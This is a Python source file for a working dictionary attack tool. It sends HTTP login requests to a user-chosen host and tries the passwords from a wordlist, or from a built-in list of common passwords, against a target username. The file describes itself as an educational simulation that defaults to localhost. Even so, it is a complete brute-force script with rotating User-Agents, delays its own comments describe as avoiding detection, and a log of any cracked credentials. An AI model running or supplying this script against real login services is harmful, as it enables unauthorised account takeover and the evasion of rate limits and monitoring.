#!/usr/bin/env python3

import socket
import time
import threading
import hashlib
import random
import os
from urllib.parse import urlencode

class DictionaryAttacker:
    def __init__(self, target_host="127.0.0.1", target_port=8080):
        self.target_host = target_host
        self.target_port = target_port
        self.wordlist = []
        self.success = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.attack_log = []
        
        # Attack configuration
        self.delay_min = 0.05  # Minimum delay between requests
        self.delay_max = 0.2   # Maximum delay between requests
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
    def load_wordlist(self, filename="wordlist.txt"):
        """Load password dictionary from file"""
        try:
            with open(filename, 'r') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.wordlist)} passwords from wordlist")
        except FileNotFoundError:
            print("[!] Wordlist file not found, using default passwords")
            self.wordlist = [
                "password", "123456", "admin", "letmein", "welcome",
                "password123", "admin123", "qwerty", "abc123", "12345678",
                "password1", "secret", "root", "toor", "guest"
            ]
    
    def craft_login_packet(self, username, password):
        """Craft HTTP POST request for login attempt with variable headers"""
        data = urlencode({
            'username': username,
            'password': password
        })
        
        # Randomize User-Agent to simulate different browsers
        user_agent = random.choice(self.user_agents)
        
        # Add timestamp for session tracking
        session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
        request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
        
        return request.encode()
    
    def send_attack_packet(self, username, password):
        """Send login attempt and analyze response"""
        attempt_start = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_host, self.target_port))
            
            packet = self.craft_login_packet(username, password)
            sock.send(packet)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            self.attempts += 1
            response_time = time.time() - attempt_start
            
            # Log the attempt
            log_entry = {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "response_time": response_time,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "success": False
            }
            
            if "HTTP/1.1 200 OK" in response and "SUCCESS" in response:
                print(f"[+] SUCCESS! Found password: {password} (Response time: {response_time:.3f}s)")
                log_entry["success"] = True
                self.success = True
                self.found_password = password
                self.attack_log.append(log_entry)
                return True
            elif "HTTP/1.1 429" in response:
                print(f"[!] Rate limited - attempt {self.attempts}: {username}:{password}")
                log_entry["rate_limited"] = True
            elif "HTTP/1.1 401" in response or "HTTP/1.1 403" in response:
                print(f"[-] Failed attempt {self.attempts}: {username}:{password} (Response time: {response_time:.3f}s)")
            else:
                print(f"[?] Unexpected response for attempt {self.attempts}: {username}:{password}")
                
            self.attack_log.append(log_entry)
            return False
                
        except socket.timeout:
            print(f"[!] Timeout on attempt {self.attempts}: {username}:{password}")
            return False
        except ConnectionRefusedError:
            print(f"[!] Connection refused - target may be down")
            return False
        except Exception as e:
            print(f"[!] Connection error on attempt {self.attempts}: {e}")
            return False
    
    def launch_attack(self, target_username="admin"):
        """Launch dictionary attack against target"""
        print(f"[*] Starting dictionary attack against {self.target_host}:{self.target_port}")
        print(f"[*] Target username: {target_username}")
        print(f"[*] Dictionary size: {len(self.wordlist)} passwords")
        print(f"[*] Delay range: {self.delay_min:.3f}s - {self.delay_max:.3f}s")
        print("[*] Attack initiated...\n")
        
        self.start_time = time.time()
        
        for i, password in enumerate(self.wordlist):
            if self.success:
                break
            
            # Show progress
            progress = ((i + 1) / len(self.wordlist)) * 100
            print(f"[*] Progress: {progress:.1f}% ({i+1}/{len(self.wordlist)})")
                
            if self.send_attack_packet(target_username, password):
                break
            
            # Variable delay to simulate human behavior and avoid detection
            delay = random.uniform(self.delay_min, self.delay_max)
            time.sleep(delay)
        
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.show_attack_summary(target_username, duration)
    
    def show_attack_summary(self, target_username, duration):
        """Display comprehensive attack summary"""
        print("\n" + "="*60)
        print("              DICTIONARY ATTACK SUMMARY")
        print("="*60)
        
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Username: {target_username}")
        print(f"Attack duration: {duration:.2f} seconds")
        print(f"Total attempts: {self.attempts}")
        
        if self.attempts > 0:
            avg_response_time = sum(log['response_time'] for log in self.attack_log if 'response_time' in log) / len(self.attack_log)
            attempts_per_second = self.attempts / duration if duration > 0 else 0
            print(f"Average response time: {avg_response_time:.3f} seconds")
            print(f"Attempts per second: {attempts_per_second:.2f}")
        
        if self.success:
            print(f"\n[+] ATTACK SUCCESSFUL!")
            print(f"[+] Valid credentials found: {target_username}:{self.found_password}")
            
            # Find the successful attempt
            for log in self.attack_log:
                if log.get('success', False):
                    print(f"[+] Password cracked on attempt #{log['attempt']}")
                    success_time = (log['attempt'] / self.attempts) * duration if self.attempts > 0 else 0
                    print(f"[+] Time to success: {success_time:.2f} seconds")
                    break
        else:
            print(f"\n[-] ATTACK FAILED")
            print(f"[-] No valid password found in dictionary")
        
        # Show statistics
        failed_attempts = len([log for log in self.attack_log if not log.get('success', False)])
        rate_limited = len([log for log in self.attack_log if log.get('rate_limited', False)])
        
        print(f"\nStatistics:")
        print(f"  Failed attempts: {failed_attempts}")
        print(f"  Rate limited responses: {rate_limited}")
        
        # Save attack log
        self.save_attack_log(target_username)
    
    def save_attack_log(self, target_username):
        """Save attack log to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_filename = f"dictionary_attack_log_{timestamp}.txt"
        
        try:
            with open(log_filename, 'w') as f:
                f.write(f"Dictionary Attack Log\n")
                f.write(f"Target: {self.target_host}:{self.target_port}\n")
                f.write(f"Username: {target_username}\n")
                f.write(f"Attack started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n")
                f.write(f"Total attempts: {self.attempts}\n")
                f.write(f"Success: {'Yes' if self.success else 'No'}\n")
                if self.success:
                    f.write(f"Found password: {self.found_password}\n")
                f.write("\n" + "="*50 + "\n")
                f.write("Detailed Attempt Log:\n")
                f.write("="*50 + "\n")
                
                for log in self.attack_log:
                    status = "SUCCESS" if log.get('success', False) else "FAILED"
                    f.write(f"[{log['timestamp']}] Attempt #{log['attempt']}: {log['username']}:{log['password']} - {status}")
                    if 'response_time' in log:
                        f.write(f" (Response: {log['response_time']:.3f}s)")
                    if log.get('rate_limited', False):
                        f.write(" [RATE LIMITED]")
                    f.write("\n")
            
            print(f"\n[*] Attack log saved to: {log_filename}")
            
        except Exception as e:
            print(f"[!] Failed to save attack log: {e}")

def main():
    print("="*60)
    print("      DICTIONARY ATTACK SIMULATION - ATTACKER")
    print("="*60)
    print("Educational/Defensive Security Purposes Only")
    print("="*60)
    
    attacker = DictionaryAttacker()
    
    # Load wordlist
    attacker.load_wordlist("wordlist.txt")
    
    # Get target information
    target_host = input("\nEnter target host (default: 127.0.0.1): ").strip() or "127.0.0.1"
    target_port = int(input("Enter target port (default: 8080): ").strip() or "8080")
    target_user = input("Enter target username (default: admin): ").strip() or "admin"
    
    attacker.target_host = target_host
    attacker.target_port = target_port
    
    print(f"\n[*] Target: {target_host}:{target_port}")
    print(f"[*] Username: {target_user}")
    
    input("\nPress Enter to start attack...")
    
    try:
        attacker.launch_attack(target_user)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Attack failed with error: {e}")

if __name__ == "__main__":
    main()